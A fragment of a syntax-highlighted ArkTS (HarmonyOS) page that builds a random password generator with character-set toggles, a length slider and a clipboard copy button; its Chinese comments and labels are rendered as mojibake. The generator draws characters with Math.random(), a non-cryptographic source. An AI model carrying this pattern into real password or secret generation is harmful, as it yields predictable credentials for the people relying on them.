class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// å¯¼å…¥å‰ªè´´æ¿æœåŠ¡</span></span><br><span class="line"><span class="keyword">import</span> &#123; pasteboard &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>;</span><br><span class="line"><span class="comment">// å¯¼å…¥å¼¹çª—æç¤ºæœåŠ¡</span></span><br><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä½¿ç”¨è£…é¥°å™¨å®šä¹‰ä¸€ä¸ªå¯è§‚å¯Ÿçš„ç±»ï¼Œç”¨äºå¯†ç é€‰é¡¹</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PasswordOption</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string; <span class="comment">// é€‰é¡¹åç§°</span></span><br><span class="line">  <span class="attr">characters</span>: string; <span class="comment">// è¯¥é€‰é¡¹å¯¹åº”çš„å­—ç¬¦é›†</span></span><br><span class="line">  <span class="comment">// å®šä¹‰æ˜¯å¦é€‰ä¸­ï¼Œé»˜è®¤ä¸ºtrue</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">selected</span>: boolean = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰æ˜¯å¦å¯ç”¨ï¼Œé»˜è®¤ä¸ºtrue</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">enabled</span>: boolean = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–nameå’Œcharacters</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: string, characters: string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">characters</span> = characters;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä½¿ç”¨è£…é¥°å™¨å®šä¹‰ä¸€ä¸ªå…¥å£ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">PasswordGeneratorPage</span> &#123;</span><br><span class="line">  <span class="comment">// å®šä¹‰å¯†ç é€‰é¡¹æ•°ç»„</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">options</span>: <span class="title class_">PasswordOption</span>[] = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PasswordOption</span>(<span class="string">&quot;å¤§å†™å­—æ¯&quot;</span>, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PasswordOption</span>(<span class="string">&quot;å°å†™å­—æ¯&quot;</span>, <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PasswordOption</span>(<span class="string">&quot;æ•°å­—&quot;</span>, <span class="string">&quot;0123456789&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PasswordOption</span>(<span class="string">&quot;ç‰¹æ®Šå­—ç¬¦&quot;</span>, <span class="string">&quot;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?&quot;</span>),</span><br><span class="line">  ];</span><br><span class="line">  <span class="comment">// å®šä¹‰å¯†ç é•¿åº¦çŠ¶æ€ï¼Œé»˜è®¤å€¼ä¸º10</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">passwordLength</span>: number = <span class="number">10</span>;</span><br><span class="line">  <span class="comment">// åŸºç¡€é—´è·</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">baseSpacing</span>: number = <span class="number">30</span>;</span><br><span class="line">  <span class="comment">// ç”Ÿæˆçš„å¯†ç </span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">generatedPassword</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// æ˜¯å¦å¯ç”¨å¤åˆ¶æŒ‰é’®</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isCopyButtonEnabled</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// ä¸»é¢˜è‰²</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">primaryColor</span>: string = <span class="string">&#x27;#71dec7&#x27;</span>;</span><br><span class="line">  <span class="comment">// å­—ä½“é¢œè‰²</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">fontColor</span>: string = <span class="string">&quot;#2e2e2e&quot;</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç”Ÿæˆå¯†ç çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">generatePassword</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> characterSet = <span class="string">&#x27;&#x27;</span>; <span class="comment">// åˆå§‹åŒ–å­—ç¬¦é›†åˆ</span></span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰é€‰é¡¹ï¼Œå¦‚æœé€‰é¡¹è¢«é€‰ä¸­åˆ™åŠ å…¥å­—ç¬¦é›†åˆ</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> option <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">options</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (option.<span class="property">selected</span>) &#123;</span><br><span class="line">        characterSet += option.<span class="property">characters</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> password = <span class="string">&#x27;&#x27;</span>; <span class="comment">// åˆå§‹åŒ–å¯†ç å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="comment">// æ ¹æ®å¯†ç é•¿åº¦ç”Ÿæˆéšæœºå¯†ç </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">passwordLength</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> randomIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * characterSet.<span class="property">length</span>);</span><br><span class="line">      password += characterSet[randomIndex];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">generatedPassword</span> = password; <span class="comment">// æ›´æ–°ç”Ÿæˆçš„å¯†ç </span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¤åˆ¶åˆ°å‰ªè´´æ¿çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">copyToClipboard</span>(<span class="params">text: string</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> pasteboardData = pasteboard.<span class="title function_">createData</span>(pasteboard.<span class="property">MIMETYPE_TEXT_PLAIN</span>, text); <span class="comment">// åˆ›å»ºå‰ªè´´æ¿æ•°æ®</span></span><br><span class="line">    <span class="keyword">const</span> systemPasteboard = pasteboard.<span class="title function_">getSystemPasteboard</span>(); <span class="comment">// è·å–ç³»ç»Ÿå‰ªè´´æ¿</span></span><br><span class="line">    systemPasteboard.<span class="title function_">setData</span>(pasteboardData); <span class="comment">// å°†æ•°æ®æ”¾å…¥å‰ªåˆ‡æ¿</span></span><br><span class="line">    promptAction.<span class="title function_">showToast</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;å·²å¤åˆ¶&#x27;</span> &#125;); <span class="comment">// æ˜¾ç¤ºå¤åˆ¶æˆåŠŸçš„æç¤º</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ£€æŸ¥é€‰é¡¹é€‰æ‹©çŠ¶æ€çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">checkOptionsSelection</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> selectedCount = <span class="number">0</span>; <span class="comment">// è®°å½•å·²é€‰ä¸­çš„é€‰é¡¹æ•°é‡</span></span><br><span class="line">    <span class="keyword">let</span> lastSelectedIndex = <span class="number">0</span>; <span class="comment">// è®°å½•æœ€åä¸€ä¸ªé€‰ä¸­çš„é€‰é¡¹ç´¢å¼•</span></span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰é€‰é¡¹</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">options</span>[i].<span class="property">enabled</span> = <span class="literal">true</span>; <span class="comment">// é»˜è®¤å¯ç”¨æ‰€æœ‰é€‰é¡¹</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>[i].<span class="property">selected</span>) &#123;</span><br><span class="line">        lastSelectedIndex = i; <span class="comment">// æ›´æ–°æœ€åä¸€ä¸ªé€‰ä¸­çš„é€‰é¡¹ç´¢å¼•</span></span><br><span class="line">        selectedCount++; <span class="comment">// å¢åŠ é€‰ä¸­è®¡æ•°</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¦‚æœåªæœ‰ä¸€ä¸ªé€‰é¡¹è¢«é€‰ä¸­ï¼Œåˆ™ç¦ç”¨è¯¥é€‰é¡¹é˜²æ­¢å…¶è¢«å–æ¶ˆé€‰ä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (selectedCount === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">options</span>[lastSelectedIndex].<span class="property">enabled</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºé¡µé¢å¸ƒå±€çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="comment">// æ ‡é¢˜æ </span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&quot;éšæœºå¯†ç ç”Ÿæˆ&quot;</span>)</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)<span class="comment">// è®¾ç½®å®½åº¦ä¸º100%</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">54</span>)<span class="comment">// è®¾ç½®é«˜åº¦ä¸º54</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">18</span>)<span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">        .<span class="title function_">fontWeight</span>(<span class="number">600</span>)<span class="comment">// è®¾ç½®å­—ä½“ç²—ç»†</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// è®¾ç½®æ–‡æœ¬å±…ä¸­å¯¹é½</span></span><br><span class="line">        .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>); <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// å¯†ç é•¿åº¦è®¾ç½®éƒ¨åˆ†</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`å¯†ç é•¿åº¦ï¼š`</span>)<span class="comment">// å¯†ç é•¿åº¦æ ‡ç­¾</span></span><br><span class="line">            .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>);</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.passwordLength&#125;</span>`</span>)<span class="comment">// æ˜¾ç¤ºå½“å‰å¯†ç é•¿åº¦</span></span><br><span class="line">            .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>, <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span> &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// æ»‘åŠ¨æ¡è®¾ç½®å¯†ç é•¿åº¦</span></span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;4&#x27;</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>).<span class="title function_">width</span>(<span class="number">20</span>);</span><br><span class="line">          <span class="title class_">Slider</span>(&#123;</span><br><span class="line">            <span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">passwordLength</span>, <span class="comment">// å½“å‰å€¼</span></span><br><span class="line">            <span class="attr">min</span>: <span class="number">4</span>, <span class="comment">// æœ€å°å€¼</span></span><br><span class="line">            <span class="attr">max</span>: <span class="number">32</span>, <span class="comment">// æœ€å¤§å€¼</span></span><br><span class="line">            <span class="attr">style</span>: <span class="title class_">SliderStyle</span>.<span class="property">InSet</span> <span class="comment">// æ»‘åŠ¨æ¡æ ·å¼</span></span><br><span class="line">          &#125;)</span><br><span class="line">            .<span class="title function_">layoutWeight</span>(<span class="number">1</span>)<span class="comment">// å¸ƒå±€æƒé‡</span></span><br><span class="line">            .<span class="title function_">blockColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// æ»‘å—é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">trackColor</span>(<span class="string">&#x27;#EBEBEB&#x27;</span>)<span class="comment">// è½¨é“é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">trackThickness</span>(<span class="number">30</span>)<span class="comment">// è½¨é“åšåº¦</span></span><br><span class="line">            .<span class="title function_">blockSize</span>(&#123; <span class="attr">width</span>: <span class="number">55</span>, <span class="attr">height</span>: <span class="number">55</span> &#125;)<span class="comment">// æ»‘å—å¤§å°</span></span><br><span class="line">            .<span class="title function_">selectedColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)<span class="comment">// é€‰ä¸­é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">onChange</span>(<span class="function">(<span class="params">value: number, mode: SliderChangeMode</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">passwordLength</span> = value; <span class="comment">// æ›´æ–°å¯†ç é•¿åº¦</span></span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;value:&#x27;</span> + value + <span class="string">&#x27;mode&#x27;</span> + mode.<span class="property">toString</span>); <span class="comment">// æ‰“å°æ—¥å¿—</span></span><br><span class="line">            &#125;);</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;32&#x27;</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>).<span class="title function_">width</span>(<span class="number">20</span>);</span><br><span class="line">        &#125;.<span class="title function_">margin</span>(&#123;</span><br><span class="line">          <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">          <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">          <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// é€‰é¡¹è®¾ç½®éƒ¨åˆ†</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;é€‰é¡¹&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>, <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>, <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span> &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// åŠ¨æ€ç”Ÿæˆæ¯ä¸ªé€‰é¡¹çš„UIå…ƒç´ </span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">options</span>, <span class="function">(<span class="params">option: PasswordOption, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Row</span>() &#123;</span><br><span class="line">            <span class="title class_">Text</span>(option.<span class="property">name</span>)<span class="comment">// é€‰é¡¹åç§°</span></span><br><span class="line">              .<span class="title function_">fontWeight</span>(<span class="number">400</span>)</span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">16</span>)</span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>)</span><br><span class="line">              .<span class="title function_">layoutWeight</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="title class_">Toggle</span>(&#123; <span class="attr">type</span>: <span class="title class_">ToggleType</span>.<span class="property">Switch</span>, <span class="attr">isOn</span>: option.<span class="property">selected</span> &#125;)<span class="comment">// åˆ‡æ¢æŒ‰é’®</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="string">&#x27;100lpx&#x27;</span>)</span><br><span class="line">              .<span class="title function_">height</span>(<span class="string">&#x27;50lpx&#x27;</span>)</span><br><span class="line">              .<span class="title function_">enabled</span>(option.<span class="property">enabled</span>)<span class="comment">// æ˜¯å¦å¯ç”¨åˆ‡æ¢</span></span><br><span class="line">              .<span class="title function_">selectedColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)</span><br><span class="line">              .<span class="title function_">onChange</span>(<span class="function">(<span class="params">isOn: boolean</span>) =&gt;</span> &#123;</span><br><span class="line">                option.<span class="property">selected</span> = isOn; <span class="comment">// æ›´æ–°é€‰é¡¹çŠ¶æ€</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">checkOptionsSelection</span>(); <span class="comment">// æ£€æŸ¥é€‰é¡¹é€‰æ‹©çŠ¶æ€</span></span><br><span class="line">              &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">          .<span class="title function_">padding</span>(&#123;</span><br><span class="line">            <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing / <span class="number">3</span>&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing / <span class="number">3</span>&#125;</span>lpx`</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">hitTestBehavior</span>(<span class="title class_">HitTestMode</span>.<span class="property">Block</span>)</span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (option.<span class="property">enabled</span>) &#123;</span><br><span class="line">              option.<span class="property">selected</span> = !option.<span class="property">selected</span>; <span class="comment">// åˆ‡æ¢é€‰é¡¹çŠ¶æ€</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// ç”Ÿæˆå¯†ç æŒ‰é’®</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;ç”Ÿæˆå¯†ç &#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">54</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.baseSpacing * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123;</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;)<span class="comment">// ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">generatePassword</span>(); <span class="comment">// ç”Ÿæˆå¯†ç </span></span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ˜¾ç¤ºç”Ÿæˆçš„å¯†ç </span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`å¯†ç ç»“æœï¼š`</span>)</span><br><span class="line">          .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">fontColor</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123;</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">          &#125;);</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.generatedPassword&#125;</span>`</span>)<span class="comment">// æ˜¾ç¤ºç”Ÿæˆçš„å¯†ç </span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">          .<span class="title function_">padding</span>(&#123; <span class="attr">left</span>: <span class="number">5</span>, <span class="attr">right</span>: <span class="number">5</span> &#125;)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123;</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing / <span class="number">3</span>&#125;</span>lpx`</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// å¤åˆ¶æŒ‰é’®</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;å¤åˆ¶&#x27;</span>)</span><br><span class="line">          .<span class="title function_">enabled</span>(<span class="variable language_">this</span>.<span class="property">generatedPassword</span> ? <span class="literal">true</span> : <span class="literal">false</span>)<span class="comment">// åªæœ‰ç”Ÿæˆäº†å¯†ç æ‰å¯ç”¨å¤åˆ¶æŒ‰é’®</span></span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">primaryColor</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">54</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.baseSpacing * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123;</span><br><span class="line">            <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span>,</span><br><span class="line">            <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;)</span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">generatedPassword</span>); <span class="comment">// å¤åˆ¶å¯†ç </span></span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title 